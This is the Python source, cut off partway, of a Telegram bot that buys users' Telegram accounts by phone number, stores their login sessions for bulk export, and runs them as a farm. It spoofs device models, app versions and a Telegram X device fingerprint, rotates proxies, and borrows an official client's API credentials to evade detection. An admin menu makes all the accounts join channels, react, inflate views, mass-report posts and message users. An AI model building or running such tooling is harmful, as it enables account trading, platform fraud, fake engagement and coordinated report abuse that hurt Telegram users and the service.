from telethon.tl.functions.messages import RequestAppWebViewRequest, RequestWebViewRequest
from telethon.tl.types import InputBotAppShortName, JsonString, JsonObject, JsonObjectValue, JsonNumber
from telethon import TelegramClient, events, Button, functions, types
from telethon.types import KeyboardButtonSimpleWebView

from telethon.tl.functions import InitConnectionRequest
from telethon.tl.functions.help import GetConfigRequest
from telethon.sessions import StringSession

import json, re, phonenumbers, random, requests, os, shutil, asyncio, zipfile
from mysql.connector import errors as mysql_errors
from jdatetime import datetime as jdatetime
from mysql.connector import connect
from time import time as timestamp
from datetime import datetime
from telethon import errors
import zipfile, builtins

# --------- [ Read Informations ] --------- #
config = json.load(open('data/config.json', 'r'))

# --------- [ Connect To Telegram ] --------- #
app = TelegramClient(session=config['session'], api_id=config['api_id'], api_hash=config['api_hash']).start(bot_token=config['token'])
app.parse_mode = 'html'

# --------- [ Connect To Database ] --------- #
db = connect(host='localhost', user=config['database']['db_name'], password=config['database']['db_password'], database=config['database']['db_username'])
cursor = db.cursor(buffered=True)

# --------- [ Functions ] --------- #
async def file_put(file_name, content, mode='w'):
    with open(file=file_name, mode=mode, encoding='UTF-8') as file:
        file.write(content)

async def file_get(file_name):
    with open(file=file_name, mode='r') as file:
        return file.read()

async def step(step, chat_id):
    cursor.execute("UPDATE `users` SET `step` = %s WHERE `from_id` = %s", (step, chat_id))
    db.commit()

async def set_language(lang, chat_id):
    cursor.execute("UPDATE `users` SET `lang` = %s WHERE `from_id` = %s", (lang, chat_id))
    db.commit()

async def clear_temporary_data(chat_id):
    cursor.execute("DELETE FROM `temporary_data` WHERE `from_id` = %s", (chat_id, ))
    db.commit()

async def get_temporary_data(chat_id):
    cursor.execute("SELECT * FROM `temporary_data` WHERE `from_id` = %s", (chat_id, ))
    return cursor.fetchone() if cursor.rowcount > 0 else False

async def update_temporary_data(chat_id, key, value):
    cursor.execute(f"UPDATE `temporary_data` SET `{key}` = %s WHERE `from_id` = %s", (value, chat_id))
    db.commit()

async def get_user_data(chat_id):
    cursor.execute("SELECT * FROM `users` WHERE `from_id` = %s", (chat_id, ))
    return cursor.fetchone() if cursor.rowcount > 0 else False

async def exists_user(chat_id):
    cursor.execute("SELECT * FROM `users` WHERE `from_id` = %s", (chat_id, ))
    return True if cursor.rowcount > 0 else False

async def account_exists(phone):
    cursor.execute("SELECT * FROM `accounts` WHERE `number` = %s", (phone, ))
    return True if cursor.rowcount > 0 else False

async def channel_exists(channel):
    cursor.execute("SELECT * FROM `channels` WHERE `channel` = %s", (channel, ))
    return True if cursor.rowcount > 0 else False

async def change_wallet(chat_id, wallet):
    cursor.execute("UPDATE `users` SET `wallet` = %s WHERE `from_id` = %s", (wallet, chat_id))
    db.commit()

async def get_temporary_country_data(file_name):
    if os.path.exists(path=file_name):
        with open(file=file_name, mode='r', encoding='UTF-8') as file:
            return str(file.read()).split('\n')
    else:
        return False

async def confirm_account(stamp, minute):
    minute_diff = (int(timestamp()) - stamp) // 60
    if minute_diff >= minute:
        return True
    else:
        return False

async def zip_folder(folder, save, allow=['session', 'json']):
    zip_file = zipfile.ZipFile(save, 'w', zipfile.ZIP_DEFLATED)
    for foldername, subfolders, filenames in os.walk(folder):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            if any(file_path.endswith(ext) for ext in allow):
                zip_file.write(file_path, os.path.relpath(file_path, folder))
    zip_file.close()

async def delete_accounts():
    cursor.execute("DELETE FROM `accounts`")
    db.commit()
    sessions = os.listdir('sessions')
    for session in sessions:
        os.remove(f'sessions/{session}')

async def get_proxy():
    cursor.execute("SELECT * FROM `proxies` WHERE `status` = 1 ORDER BY RAND() LIMIT 1")
    proxies = cursor.fetchall()
    for proxy in proxies:
        req_proxies = {
            'http': f'socks5h://{proxy[3]}:{proxy[4]}@{proxy[1]}:{proxy[2]}',
            'https': f'socks5h://{proxy[3]}:{proxy[4]}@{proxy[1]}:{proxy[2]}'
        }
        try:
            response = requests.get('https://www.example.org', proxies=req_proxies, timeout=5)
            if response.status_code == 200:
                return {'proxy_type': 'socks5', 'addr': proxy[1], 'port': int(proxy[2]), 'username': proxy[3], 'password': proxy[4]}, (proxy[1] + ':' + proxy[2] + ':' + proxy[3] + ':' + proxy[4])
        except Exception as e:
            return e
    return False, None

async def get_proxy_for_request():
    cursor.execute("SELECT * FROM `proxies` WHERE `status` = 1 ORDER BY RAND() LIMIT 1")
    proxies = cursor.fetchall()
    for proxy in proxies:
        req_proxies = {
            'http': f'socks5h://{proxy[3]}:{proxy[4]}@{proxy[1]}:{proxy[2]}',
            'https': f'socks5h://{proxy[3]}:{proxy[4]}@{proxy[1]}:{proxy[2]}'
        }
        try:
            response = requests.get('https://www.example.org', proxies=req_proxies, timeout=5)
            if response.status_code == 200:
                return req_proxies
        except Exception as e:
            return e
    return False, None

async def generate_proxy_dict(proxy):
    proxy = proxy.split(':')
    return {'proxy_type': 'socks5', 'addr': proxy[0], 'port': int(proxy[1]), 'username': proxy[2], 'password': proxy[3]}

async def extract_number(input):
    pattern = r'\+?\d+(?:\s*\d+)*(?:\s*\(\d+\))?(?:\s*\d+)*'
    matches = re.findall(pattern, input)
    if len(matches) > 0:
        return matches[0].replace(' ', '').replace('(', '').replace(')', '')
    return False

async def get_country_code(phone):
    response = phonenumbers.parse(number=phone)
    response = re.findall(r'Country Code: (.*) National Number: (.*)', str(response))
    return list(response[0])

async def get_random_api(official=False):
    if official == False:
        with open('data/apis.txt', 'r') as file:
            api_list = str(file.read()).split('\n')
            if len(api_list) > 0:
                return str(random.choice(api_list)).split(':')
            return False
    elif official == True:
        return ['2040', 'b18441a1ff607e10a989891a5462e627']

async def get_open_country_count():
    cursor.execute(f"SELECT * FROM `open_country` WHERE `status` = 1")
    return cursor.rowcount

async def get_accounts_count():
    cursor.execute(f"SELECT * FROM `accounts`")
    return cursor.rowcount

async def country_name_exists(input):
    cursor.execute("SELECT * FROM `open_country` WHERE `country_name` = %s", (input, ))
    return True if cursor.rowcount > 0 else False

async def country_code_exists(input):
    cursor.execute("SELECT * FROM `open_country` WHERE `country_code` = %s", (input, ))
    return True if cursor.rowcount > 0 else False

async def get_accounts_key(page=1):
    offset = (page - 1) * 7
    addpage = page + 1; menpage = page - 1;
    cursor.execute(f"SELECT * FROM `accounts` ORDER BY `row` DESC LIMIT 7 OFFSET {offset}")
    if cursor.rowcount > 0:
        accounts = cursor.fetchall()
        keyboard = [[Button.inline(text='📁 Receive all accounts as t-data', data='receive_accounts_as_tdata')], [Button.inline(text='📁 Receive all accounts with json (zip)', data='receive_accounts_with_json')], [Button.inline(text='📁 Receive all accounts without json (zip)', data='receive_accounts_without_json')], [Button.inline(text='📞 Add sessions (session-json)', data='add_sessionjson_to_bot')], [Button.inline(text='prefix', data='none'), Button.inline(text='number', data='none'), Button.inline(text='status', data='none'), Button.inline(text='delete', data='none')]]
        for account in accounts:
            keyboard.append([Button.inline(text=account[2], data='none'), Button.inline(text=account[3], data='get_code-' + str(account[0])), Button.inline(text='✅' if account[4] == True else '❌', data='none'), Button.inline(text='🗑', data='delete_account_from_bot-' + str(account[0]))])
        
        backpage = '<- Previous page' if page > 1 else 'none'
        nextpage = 'Next page ->' if (page * 7) < await get_accounts_count() else 'none'
        
        if backpage != 'none' and nextpage != 'none':
            keyboard.append([Button.inline(text=backpage, data=f'view_acc-{menpage}'), Button.inline(text=nextpage, data=f'view_acc-{addpage}')])
        elif backpage != 'none' and nextpage == 'none':
            keyboard.append([Button.inline(text=backpage, data=f'view_acc-{menpage}')])
        elif nextpage != 'none' and backpage == 'none':
            keyboard.append([Button.inline(text=nextpage, data=f'view_acc-{addpage}')])
            
        return keyboard
    else:
        return False

async def open_countries(page=1, language='en'):
    offset = (page - 1) * 13
    addpage = page + 1; menpage = page - 1;
    cursor.execute(f"SELECT * FROM `open_country` WHERE `status` = 1 LIMIT 7 OFFSET {offset}")
    if cursor.rowcount > 0:
        countries = cursor.fetchall()
        
        emoji_meanings = {
            '✅': {'en': 'The possibility of sending the account of this country is active', 'fa': 'امکان ارسال اکانت این کشور فعال میباشد'},
            '❌': {'en': 'The sending account of this country is temporarily closed', 'fa': 'ارسال اکانت این کشور موقت بسته میباشد'}
        }
        
        if language == 'en':
            main_message = "🌏 The list of countries that can be sent to the robot, along with their purchase price and confirmation time, are :\n\n- - - - - - - - - -\n"
        else:
            main_message = "🌏 لیست کشور های قابل ارسال به ربات همراه با قیمت خرید و تایم تایید آنها عبارتند از :\n\n- - - - - - - - - -\n"
        
        for idx, country in enumerate(countries):
            main_message += f"{list(emoji_meanings.keys())[0]} Location name : (<code>{country[2]}</code>) / {country[1]} / {country[3]}\n👉 Price : (${country[4]}) / time : {country[6]} minutes\n🔢 Capacity : <code>{country[5]}</code>\n\n" if language == 'en' else f"{list(emoji_meanings.keys())[0]} نام کشور : (<code>{country[2]}</code>) / {country[1]} / {country[3]}\n👈 قیمت : (${country[4]}) / تایم : {country[5]} دقیقه\n🔢 ظرفیت : <code>{country[5]}</code>\n\n"
        
        if language == 'en':
            main_message += '- - - - - - - - - - -\n🎛 The meaning of the emoji behind the name of each country:\n✅ The possibility of sending the account of this country is active\n❌ The sending account of this country is temporarily closed'
        else:
            main_message += '- - - - - - - - - - -\n🎛 معنای ایموجی های پشت نام هرکشور :\n✅ امکان ارسال اکانت این کشور فعال میباشد\n❌ ارسال اکانت این کشور موقت بسته میباشد'
        
        backpage = 'Previous page ->' if page > 1 else 'none'
        nextpage = '<- Next page' if (page * 13) < await get_open_country_count() else 'none'
        
        if backpage != 'none' and nextpage != 'none':
            manage_page = [
                [Button.inline(text=backpage, data=f'serlist_{menpage}'), Button.inline(text=nextpage, data=f'serlist_{addpage}')]
            ]
        elif backpage != 'none' and nextpage == 'none':
            manage_page = [
                [Button.inline(text=backpage, data=f'serlist_{menpage}')]
            ]
        elif nextpage != 'none' and backpage == 'none':
            manage_page = [
                [Button.inline(text=nextpage, data=f'serlist_{addpage}')]
            ]
        elif nextpage == 'none' and backpage == 'none':
            manage_page = False
        
        return main_message, manage_page
    else:
        return False, False

async def view_open_countries():
    cursor.execute("SELECT * FROM `open_country`")
    if cursor.rowcount > 0:
        countries = cursor.fetchall()
        key = [[Button.inline(text='prefix', data='none'), Button.inline(text='name', data='none'), Button.inline(text='flag', data='none'), Button.inline(text='status', data='none')]]
        for country in countries:
            key.append([Button.inline(text=country[2], data='view_country_prefix-' + country[1]), Button.inline(text=country[1], data='view_country_name-' + country[1]), Button.inline(text=country[3], data='none'), Button.inline(text=('✅' if country[7] == True else '❌'), data='change_open_country_status-' + str(country[0]))])
        return key
    else:
        return False

async def view_all_channels():
    cursor.execute("SELECT * FROM `channels`")
    if cursor.rowcount > 0:
        channels = cursor.fetchall()
        key = [[Button.inline(text='channels', data='none'), Button.inline(text='status', data='none')]]
        for channel in channels:
            key.append([Button.inline(text=channel[1], data='none'), Button.inline(text=('✅' if channel[2] == True else '❌'), data='change_channel_status-' + str(channel[0]))])
        return key
    else:
        return False

async def view_all_admins():
    cursor.execute("SELECT * FROM `admins`")
    if cursor.rowcount > 0:
        admins = cursor.fetchall()
        key = [[Button.inline(text='id', data='none'), Button.inline(text='username', data='none'), Button.inline(text='password', data='none'), Button.inline(text='status', data='none')]]
        for admin in admins:
            key.append([Button.inline(text=str(admin[1]), data='none'), Button.inline(text=admin[2], data='none'), Button.inline(text=admin[3], data='none'), Button.inline(text=('✅' if admin[4] == True else '❌'), data='change_admin_status-' + str(admin[0]))])
        return key
    else:
        return False

async def add_json_file(file_name, data):
    with open(f'sessions/{file_name}', 'w') as file:
        json.dump(data, file, indent=4)

async def add_proxies(file_name):
    status = {'success': 0, 'unsuccess': 0}
    with open(file=file_name, mode='r') as file:
        proxies = file.readlines()
        for proxy in proxies:
            try:
                ip, port, username, password = proxy.strip().split(':')
                cursor.execute("INSERT INTO `proxies` (`ip`, `port`, `username`, `password`, `count_use`, `status`) VALUES (%s, %s, %s, %s, %s, %s)", (ip, port, username, password, 0, 1))
                db.commit()
                status['success'] += 1
            except Exception as e:
                print(e, end='\n')
                status['unsuccess'] += 1
    return status

async def add_session_to_bot(chat_id, folder_name):
    status = {'success': 0, 'unsuccess': 0}
    for session in os.listdir(folder_name):
        if session.endswith('.session'):
            phone = session.split('.')[0]
            if os.path.exists(f'{folder_name}/{phone}.json'):
                json_data = json.load(open(f'{folder_name}/{phone}.json', 'r'))
                try:
                    country_code = await get_country_code(phone=phone if phone.startswith('+') else '+' + phone)
                    cursor.execute("INSERT INTO `accounts` (`from_id`, `country_code`, `number`, `status`) VALUES (%s, %s, %s, %s)", (chat_id, '+' + str(country_code[0]), phone, 1))
                    db.commit()
                    shutil.move(f'{folder_name}/{phone}.session', f'sessions/{phone}.session')
                    shutil.move(f'{folder_name}/{phone}.json', f'sessions/{phone}.json')
                    status['success'] += 1
                except Exception as e:
                    print(f'[-][2] Error add: {e}')
                    status['unsuccess'] += 1
            else:
                print(f'[-][3] Error add')
                status['unsuccess'] += 1
    return status

async def add_channel(channel, status):
    cursor.execute("INSERT INTO `channels` (`channel`, `status`) VALUES (%s, %s)", (channel, status))
    db.commit()
    return True

async def remove_channel(channel):
    cursor.execute("DELETE FROM `channels` WHERE `channel` = %s", (channel, ))
    db.commit()
    return True

async def get_app_version(filter='desktop'):
    if filter == 'random':
        app_version = [7.84, 1.18, 8.54, 4.61, 20.01, 3.02, 2.19, 9.10, 6.84, 12.5, 5.12, 5.14, 2.12]
        return random.choice(app_version)
    elif filter == 'desktop':
        return '4.16.8 x64'

async def get_device_model(filter='android'):
    android_phone = ['Samsung Galaxy A20s', 'Samsung Galaxy A70', 'Samsung Galaxy A01', 'Samsung Galaxy A20','Samsung Galaxy A30s', 'Samsung Galaxy A51', 'Samsung Galaxy A21s', 'Samsung Galaxy A32','Samsung Galaxy A12', 'Xiaomi Poco X3 Pro ', 'Xiaomi Redmi Note 8 pro', 'Xiaomi Poco X3 Pro ','Xiaomi Redmi Note 8', 'Xiaomi Redmi Note 9 Pro', 'Xiaomi Redmi Note 9', 'Xiaomi Poco F3','Huawei Y7 Prime 2019', 'Huawei Y9 Prime 2019', 'Huawei Y6 Prime 2019 ', 'Huawei Honor 10','Asus ROG Phone 5s', 'Asus Zenfone 3 Deluxe']
    ios_phone = ['iPhone 4S', 'iPhone 5', 'iPhone 5c', 'iPhone 5s', 'iPhone 6', 'iPhone 6 Plus', 'iPhone 6s', 'iPhone 6s Plus', 'iPhone 7', 'iPhone 7 Plus', 'iPhone 8', 'iPhone 8 Plus', 'iPhone X', 'iPhone XR', 'iPhone XS', 'iPhone XS Max', 'iPhone 11', 'iPhone 11 Pro', 'iPhone 11 Pro Max', 'iPhone SE ', 'iPhone 12 mini', 'iPhone 12', 'iPhone 12 Pro', 'iPhone 12 Pro Max', 'iPhone 13 mini', 'iPhone 13', 'iPhone 13 Pro', 'iPhone 13 Pro Max', 'Galaxy S22 Ultra', 'Galaxy S22 ', 'Galaxy Tab S8 ', 'Galaxy A53 5G', 'Galaxy Z Fold3 5g', 'Galaxy Z Flip3 5g', 'Galaxy S21 FE ']
    desktop = ['Desktop']
    if filter == 'android':
        return random.choice(android_phone)
    elif filter == 'ios':    
        return random.choice(ios_phone)
    elif filter == 'desktop':
        return random.choice(desktop)
    elif filter == 'random':
        devices = android_phone + ios_phone + desktop
        return random.choice(devices)

async def get_system_version(device):
    android_version = [9.0, 10.2, 9.1, 10.21, 9.2, 10.22, 9.3, 10.23, 9.4, 10.24, 9.5, 10.25, 9.6, 10.26, 9.7, 10.27, 9.8,10.28, 9.9, 10.29, 10.0, 10.3, 10.1, 10.31, 10.2, 10.32, 10.3, 10.33, 10.4, 10.34, 10.5, 10.35, 10.6,10.36, 10.7, 10.37, 10.8, 10.38, 10.9, 10.39, 11.0, 10.4, 11.1, 10.41, 11.2, 10.42]
    ios_version = ['iOS 12.0', 'iOS 12.4', 'iOS 12.55', 'iOS 13.0', 'iOS 13.18', 'iOS 14.01', 'iOS 15.0', 'iOS 15.01']
    desktop_version = ['Windows 10']
    
    if 'iPhone' in device:
        return random.choice(ios_version)
    elif 'Samsung' in device:
        return random.choice(android_version)
    elif 'Desktop' in device:
        return random.choice(desktop_version)

async def check_spam_bot(value):
    if 'Good news' in value or 'خبر خوب' in value or 'تبریک' in value:
        return True
    else:
        return False

async def get_bot_stat():
    cursor.execute("SELECT SUM(`balance`) FROM `users`")
    total_balance = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM `users`")
    all_users = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM `users` WHERE `status` = 0")
    block_users = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM `users` WHERE `status` = 1")
    unblock_users = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM `users` WHERE `lang` = 'fa'")
    iran_users = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM `users` WHERE `lang` = 'en'")
    english_users = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM `accounts`")
    all_accounts = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM `accounts` WHERE `status` = 1")
    confirmed_accounts = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM `accounts` WHERE `status` = 0")
    unconfirmed_accounts = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM `open_country` WHERE `status` = 1")
    open_countries = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM `close_country` WHERE `status` = 1")
    close_countries = cursor.fetchone()[0]
    
    return {'all_users': all_users, 'block_users': block_users, 'unblock_users': unblock_users, 'all_accounts': all_accounts, 'confirmed_accounts': confirmed_accounts, 'unconfirmed_accounts': unconfirmed_accounts, 'open_countries': open_countries, 'close_countries': close_countries, 'iran_users': iran_users, 'english_users': english_users, 'total_balance': total_balance}

async def withdrawal_balance_submit(chat_id, price, leader_name, lang, code):
    cursor.execute("INSERT INTO `withdrawal_factors` (`from_id`, `price`, `wallet`, `code`, `status`) VALUES (%s, %s, %s, %s, %s)", (chat_id, price, leader_name, code, 0))
    db.commit()
    cursor.execute(f"UPDATE `users` SET `balance` = 0 WHERE `from_id` = %s", (chat_id, ))
    db.commit()

async def is_join(chat_id, channels=[]):
    status = []
    for channel in channels:
        try:
            permissions = await app.get_permissions(entity=channel, user=chat_id)
            if permissions.is_banned or permissions.has_left:
                status.append(False)
            status.append(True)
        except errors.rpcerrorlist.UserNotParticipantError:
            status.append(False)
    return all(status)

# --------- [ Keyboards ] --------- #
select_language = [
    [Button.text('🏴󠁧󠁢󠁥󠁮󠁧󠁿 English', resize=True), Button.text('🇮🇷 فارسی', resize=True)]
]

withdrawal_balance = [
    [Button.inline(text='💸 برداشت موجودی / Withdrawal balance 💸', data='withdrawal_balance')]
]

panel = [
    [Button.text('👤 Bot stat', resize=True)],
    [Button.text('🛡Accounts operation', resize=True)],
    [Button.text('📞 Manage accounts', resize=True), Button.text('👥 Manage users', resize=True)],
    [KeyboardButtonSimpleWebView(text='⚙ Manage settings', url=config['domain'] + '/admin_panel/manage_settings.php'), Button.text('👮‍♀ Manage admins', resize=True)],
    [KeyboardButtonSimpleWebView(text='💬 Manage texts', url=config['domain'] + '/admin_panel/manage_texts.php'), Button.text('📢 Manage channels', resize=True)],
    [Button.text('🌍 Manage capacity/country', resize=True)],
    [Button.text('🛡Manage proxies', resize=True)],
    [Button.text('🔙 back', resize=True)]
]

accounts_operation = [
    [Button.text('◽️Left channel/group'), Button.text('◽️Join channel/group')],
    [Button.text('◽️Left with folder link'), Button.text('◽️Join with folder link')],
    [Button.text('◽️Reaction'), Button.text('◽️Seen')],
    [Button.text('◽️Report post'), Button.text('◽️Start bot')],
    [Button.text('◽️Start webapp')],
    [Button.text('◽️Send message to user')],
    [Button.text(text='🔙 Back to panel', resize=True)]
]

manage_proxies = [
    # [Button.inline(text='👀 View proxies', data='view_proxies')],
    [Button.inline(text='➖ Remove proxy', data='remove_proxy'), Button.inline(text='➕ Add proxy', data='add_proxy')]
]

manage_countries = [
    [Button.inline(text='👀 View open countries', data='view_open_countries')],
    [Button.inline(text='➖ Close country', data='close_country'), Button.inline(text='➕ Open country', data='open_country')]
]

manage_channels = [
    [Button.inline(text='👀 View all channels', data='view_all_channels')],
    [Button.inline(text='➖ Remove channel', data='remove_channel'), Button.inline(text='➕ Add channel', data='add_channel')]
]

manage_admins = [
    [Button.inline(text='👀 View all admins', data='view_all_admins')],
    [Button.inline(text='➖ Remove admin', data='remove_admin'), Button.inline(text='➕ Add admin', data='add_admin')]
]

add_session_to_bot_btn = [
    [Button.inline(text='📞 Add sessions (session-json)', data='add_sessionjson_to_bot')]
]

agree_del_accounts = [
    [Button.inline(text='🗑 Delete accounts from the bot', data='agree_delete_accounts')]
]

delete_message = [
    [Button.inline(text='🗑 Delete Message', data='delete_message')]
]

back_to_panel = [
    [Button.text(text='🔙 Back to panel', resize=True)]
]

back_to_accounts_operations = [
    [Button.text(text='🔙 Back to operations', resize=True)]
]

back_to_manage_proxies = [
    [Button.inline(text='🔙 Back', data='back_to_manage_proxies')]
]

back_to_manage_country = [
    [Button.inline(text='🔙 Back', data='back_to_manage_country')]
]

back_to_manage_channels = [
    [Button.inline(text='🔙 Back', data='back_to_manage_channels')]
]

back_to_manage_admins = [
    [Button.inline(text='🔙 Back', data='back_to_manage_admins')]
]

@app.on(event=events.NewMessage())
async def messages_handler(event):
    # --------- [ varibales ] --------- #
    try:
        texts = json.load(builtins.open('data/texts.json', 'r', encoding='UTF-8'))
        cursor = db.cursor(buffered=True)
        
        text = event.raw_text
        chat_id = event.chat.id
        message_id = event.id
        first_name = event.chat.first_name
        last_name = event.chat.last_name
        username = '❌' if event.chat.username is None else event.chat.username
        
        # --------- [ Insert and get user data ] --------- #
        cursor.execute("SELECT * FROM `users` WHERE `from_id` = %s", (chat_id, ))
        if cursor.rowcount == 0:
            cursor.execute("INSERT INTO `users` (`from_id`, `join_time`) VALUES (%s, %s)", (chat_id, int(timestamp())))
            db.commit()
            cursor.execute("SELECT * FROM users WHERE from_id = %s", (chat_id,))
            user = cursor.fetchone()
        else:
            user = cursor.fetchone()
        
        cursor.execute("SELECT * FROM `settings`")
        if cursor.rowcount == 0:
            cursor.execute("INSERT INTO `settings` () VALUES ()")
        else:
            setting = cursor.fetchone()
        
        cursor.execute("SELECT * FROM `channels`")
        if cursor.rowcount == 0:
            channels = []
        else:
            channels = [channel[1] for channel in cursor.fetchall() if channel[2] == True]
        
        cursor.execute("SELECT * FROM `admins`")
        if cursor.rowcount == 0:
            admins = []
        else:
            admins = [admin[1] for admin in cursor.fetchall() if admin[4] == True]
            
        # --------- [ Date and Time ] --------- #
        if user[6] == 'none' or user[6] == 'en':
            date = datetime.now().strftime('%Y/%m/%d')
            time =datetime.now().strftime('%H:%M:%S')
        elif user[6] == 'fa':
            date = jdatetime.now().strftime('%Y/%m/%d')
            time = jdatetime.now().strftime('%H:%M:%S')
        
        # --------- [ Conditions ] --------- #
        if user[6] == 'none' and user[2] != 'select_language':
            await step('select_language', chat_id)
            await app.send_message(entity=chat_id, message=texts['select_language'], buttons=select_language, reply_to=message_id)
        
        elif user[2] == 'select_language':
            if text in ['🇮🇷 فارسی', '🏴󠁧󠁢󠁥󠁮󠁧󠁿 English']:
                lang = 'fa' if text == '🇮🇷 فارسی' else 'en'
                await step('none', chat_id)
                await set_language(lang, chat_id)
                await app.send_message(entity=chat_id, message=texts['start'][lang], buttons=Button.clear(), reply_to=message_id)
            else:
                await app.send_message(entity=chat_id, message=texts['wrong_language'], buttons=select_language, reply_to=message_id)
            
        elif len(channels) > 0 and await is_join(chat_id, channels) == False:
            await step('none', chat_id)
            await app.send_message(entity=chat_id, message=str(texts['join_channel'][user[6]]).format('\n'.join(channels)), reply_to=message_id, buttons=Button.clear())
        
        elif setting[8] == False and int(chat_id) != config['dev'] and int(chat_id) not in config['admins']:
            await step('none', chat_id)
            await app.send_message(entity=chat_id, message=texts['bot_off'][user[6]], reply_to=message_id, buttons=Button.clear())
        
        elif text == '/start' or text == '🔙 back':
            await step('none', chat_id)
            await app.send_message(entity=chat_id, message=texts['start'][user[6]], reply_to=message_id, buttons=Button.clear())
        
        elif text == '/developer':
            await app.send_message(entity=chat_id, message='Developer: @rezaj_programmer')
        
        elif text == '/cancel':
            await step('none', chat_id)
            temp = await get_temporary_data(chat_id=chat_id)
            if temp != False:
                if os.path.exists(f'sessions/{temp[4]}.session') and not os.path.exists(f'sessions/{temp[4]}.json'):
                    os.remove(f'sessions/{temp[4]}.session')
            await app.send_message(entity=chat_id, message=texts['cancel'][user[6]], reply_to=message_id)
        
        elif text == '/language':
            await step('select_language', chat_id)
            await app.send_message(entity=chat_id, message=texts['select_language'], buttons=select_language, reply_to=message_id)
        
        elif text == '/help':
            await app.send_message(entity=chat_id, message=texts['help'][user[6]], reply_to=message_id)
        
        elif text == '/rule':
            await app.send_message(entity=chat_id, message=texts['rule'][user[6]], reply_to=message_id)
        
        elif text == '/profile' or text == '/coin':
            await app.send_message(entity=chat_id, message=str(texts['profile'][user[6]]).format(chat_id, user[3], date, time), buttons=withdrawal_balance)

        elif user[2] == 'send_leader_name':
            if len(text) >= 1:
                await step('none', chat_id)
                code = random.randint(111111, 666666)
                await withdrawal_balance_submit(chat_id=chat_id, price=user[3], leader_name=text, lang=user[6], code=code)
                await app.send_message(entity=chat_id, message=str(texts['success_withdrawal'][user[6]]).format(code, ))
                payment_done = [[Button.inline(text='✅ Payment done', data=('payment_done-' + str(chat_id) + '-' + str(user[3]) + '-' + str(text)))]]
                if setting[10] is not None:
                    await app.send_message(entity=(int(setting[10]) if '-100' in setting[10] else setting[10]), message=f"💸 New balance withdrawal request was registered.\n\n◽️Name: <b>{first_name}</b>\n◽️Chat id: <code>{chat_id}</code>\n◽️Username: {'@' + username if username is not None else 'None'}\n\n◽️Amount: <code>${user[3]}</code>\n◽️Leader name: <code>{text}</code>\n\n◽️Tracking code: <code>{code}</code>\n\n⏱ <code>{date} - {time}</code>", buttons=payment_done)
                else:
                    await app.send_message(entity=config['dev'], message=f"💸 New balance withdrawal request was registered.\n\n◽️Name: <b>{first_name}</b>\n◽️Chat id: <code>{chat_id}</code>\n◽️Username: {'@' + username if username is not None else 'None'}\n\n◽️Amount: <code>${user[3]}</code>\n◽️Leader name: <code>{text}</code>\n\n◽️Tracking code: <code>{code}</code>\n\n⏱ <code>{date} - {time}</code>", buttons=payment_done)
            else:
                await app.send_message(entity=chat_id, message=texts['leader_name_invalid'][user[6]], reply_to=message_id)
        
        elif text == '/capacity' or text == '/cap':
            response = await open_countries(page=1, language=user[6])
            if response[0] != False:
                if response[1] != False:
                    await app.send_message(entity=chat_id, message=response[0], reply_to=message_id, buttons=response[2])
                else:
                    await app.send_message(entity=chat_id, message=response[0], reply_to=message_id)
            else:
                await app.send_message(entity=chat_id, message=texts['no_country_active'][user[6]], reply_to=message_id)
        
        # -------------------------------------- #
        
        elif await extract_number(text) != False and user[2] in ['none']:
            print(f"\n[+] Receive account status: {'ON' if setting[4] == True else 'OFF'}")
            if setting[4] == True:
                await clear_temporary_data(chat_id=chat_id)
                phone = await extract_number(input=text)
                country_code = await get_country_code(phone=phone if phone.startswith('+') else '+' + phone)
                if await account_exists(phone=phone) == False:
                    cursor.execute("SELECT * FROM `open_country` WHERE `country_code` = %s AND `status` = %s", ('+' + str(country_code[0]), 1))
                    if cursor.rowcount > 0:
                        open_country_fetch = cursor.fetchone()
                        if open_country_fetch[5] > 0:
                            wait_res = await app.send_message(entity=chat_id, message=texts['wait'][user[6]], reply_to=message_id)
                            # ------------------ #
                            try:
                                cursor.execute("SELECT * FROM `open_country`")
                                sensitive_countries = ['+95']
                                
                                get_api = await get_random_api(official=True if ('+' + str(country_code[0])) in sensitive_countries else False)
                                proxy = await get_proxy()
                                
                                device_model = await get_device_model(filter='desktop')
                                app_version = await get_app_version(filter='desktop')
                                system_version = await get_system_version(device=device_model)
                                
                                jsonValue = JsonObject(
                                    value=[
                                        JsonObjectValue(
                                            key="device_token",
                                            value=JsonString(
                                                value="ceCR3KjzRvKMOFC1d2_5yK:APA91bEKX2AJJY4v1riq7UFTVWrFh9JtxgIuPne2vZdFQDyy2ANNld9UzNFWiDXqp3VVTQwo7sY_kjrQKXNWWK0yUDY-OJMjWggiDFvCyGXDtb3shHBIYs5RV-9cQzUE-I6ovQYn7SRQ"
                                            )
                                        ),
                                        JsonObjectValue(
                                            key="package_id",
                                            value=JsonString(
                                                value="org.thunderdog.challegram"
                                            )
                                        ),
                                        JsonObjectValue(
                                            key="installer",
                                            value=JsonString(
                                                value="com.google.android.packageinstaller"
                                            )
                                        ),
                                        JsonObjectValue(
                                            key="data",
                                            value=JsonString(
                                                value="66462134345a6adac3c1d5aea9cef0421b7cab68"
                                            )
                                        ),
                                        JsonObjectValue(
                                            key="tz_offset",
                                            value=JsonNumber(
                                                value=12600.000000
                                            )
                                        ),
                                        JsonObjectValue(
                                            key="git",
                                            value=JsonObject(
                                                value=[
                                                    JsonObjectValue(
                                                        key="remote",
                                                        value=JsonString(
                                                            value="TGX-Android/Telegram-X"
                                                        )
                                                    ),
                                                    JsonObjectValue(
                                                        key="commit",
                                                        value=JsonString(
                                                            value="99a404b6"
                                                        )
                                                    ),
                                                    JsonObjectValue(
                                                        key="tdlib",
                                                        value=JsonString(
                                                            value="1886bcf"
                                                        )
                                                    ),
                                                    JsonObjectValue(
                                                        key="date",
                                                        value=JsonNumber(
                                                            value=1690901041.000000
                                                        )
                                                    )
                                                ]
                                            )
                                        )
                                    ]
                                )
                                
                                print(f'----------------------------')
                                print(f'[+] Adding account -> {phone}')
                                print(f'[+] App version: {app_version}')
